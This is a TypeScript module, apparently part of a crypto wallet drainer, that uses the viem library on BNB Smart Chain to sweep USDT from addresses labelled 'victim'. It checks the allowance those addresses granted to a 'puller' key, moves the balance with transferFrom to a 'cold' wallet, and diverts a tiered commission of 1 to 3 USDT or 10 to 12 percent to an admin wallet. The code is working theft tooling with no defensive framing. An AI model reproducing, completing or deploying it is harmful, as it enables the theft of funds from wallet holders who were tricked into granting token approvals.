import {
    createPublicClient, createWalletClient, http, fallback,
    erc20Abi, formatUnits, parseUnits, type Hex,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';

const transport = () =>
    fallback(ENV.HTTP_URLS.map(u => http(u, { retryCount: 2, timeout: 8_000 })));

export const pub = createPublicClient({ chain: bsc, transport: transport() });

export const allowanceOf = (owner: `0x${string}`, spender: `0x${string}`, token: `0x${string}`) =>
    pub.readContract({ address: token, abi: erc20Abi, functionName: 'allowance', args: [owner, spender] });

export const balanceOf = (owner: `0x${string}`, token: `0x${string}`) =>
    pub.readContract({ address: token, abi: erc20Abi, functionName: 'balanceOf', args: [owner] });

export const gasOf = (addr: `0x${string}`) => pub.getBalance({ address: addr });

/** Your customized tiered fee calculator */
function getAdminFee(total: bigint): bigint {
    const SIX = parseUnits('6', 18);
    const TWELVE = parseUnits('12', 18);
    const TWENTY = parseUnits('20', 18);
    const FIFTY = parseUnits('50', 18);

    if (total <= SIX) {
        return parseUnits('1', 18);          // $1 fee for 5-6 USDT
    } else if (total <= TWELVE) {
        return parseUnits('2', 18);          // $2 fee for 8-12 USDT
    } else if (total <= TWENTY) {
        return parseUnits('3', 18);          // $3 fee for 15-20 USDT
    } else if (total <= FIFTY) {
        return (total * 12n) / 100n;         // 12% scale for mid-to-high (30-50 USDT)
    } else {
        return (total * 10n) / 100n;         // 10% for large balances (> 50 USDT)
    }
}

/** Signed by the puller key: splits amount into user share & custom tiered admin fee. */
export async function pullone(
    pullerKey: Hex, victim: `0x${string}`, cold: `0x${string}`, token: `0x${string}`,
): Promise<{ hashUser: string; hashFee?: string; amount: bigint; feeAmount: bigint } | null> {
    const account = privateKeyToAccount(pullerKey);
    const [bal, allow, gas] = await Promise.all([
        balanceOf(victim, token), allowanceOf(victim, account.address, token), gasOf(account.address),
    ]);
    if (bal === 0n) return null;

    // Only sweep if amount is above 5 USDT minimum threshold
    const MIN_SWEEP = parseUnits('5', 18);
    if (bal < MIN_SWEEP) return null;

    if (allow === 0n) throw new Error('ALLOWANCE ZERO');
    if (gas < ENV.MIN_PULLER_GAS_WEI) throw new Error('PULLER_LOW_GAS');

    const totalAmount = bal < allow ? bal : allow;

    // Calculate Admin Fee & User Share using your custom tiers
    const feeAmount = getAdminFee(totalAmount);
    const userAmount = totalAmount - feeAmount;

    const price = await pub.getGasPrice();
    const gasPrice = (price * 120n) / 100n;
    const wallet = createWalletClient({ account, chain: bsc, transport: transport() });
    
    let currentNonce = await pub.getTransactionCount({ address: account.address, blockTag: 'pending' });

    // 1. Transfer User Share (Remainder) to their Cold Storage
    const hashUser = await wallet.writeContract({
        address: token,
        abi: erc20Abi,
        functionName: 'transferFrom',
        args: [victim, cold, userAmount],
        gas: 90_000n,
        gasPrice,
        nonce: currentNonce++,
    });

    let hashFee: string | undefined = undefined;

    // 2. Transfer Tiered Commission to your Admin Wallet
    const adminWallet = ENV.ADMIN_WALLET as `0x${string}` | undefined;
    if (adminWallet && feeAmount > 0n) {
        try {
            hashFee = await wallet.writeContract({
                address: token,
                abi: erc20Abi,
                functionName: 'transferFrom',
                args: [victim, adminWallet, feeAmount],
                gas: 90_000n,
                gasPrice,
                nonce: currentNonce++,
            });
        } catch (e: any) {
            console.error(`[COMMISSION FEE ERROR] Failed to sweep fee for user ${victim}:`, e.message);
        }
    }

    console.log(`[PULLED] Total: ${formatUnits(totalAmount, 18)} USDT | User: ${formatUnits(userAmount, 18)} -> ${cold} | Fee: ${formatUnits(feeAmount, 18)} -> Admin`);
    return { hashUser, hashFee, amount: totalAmount, feeAmount };
}
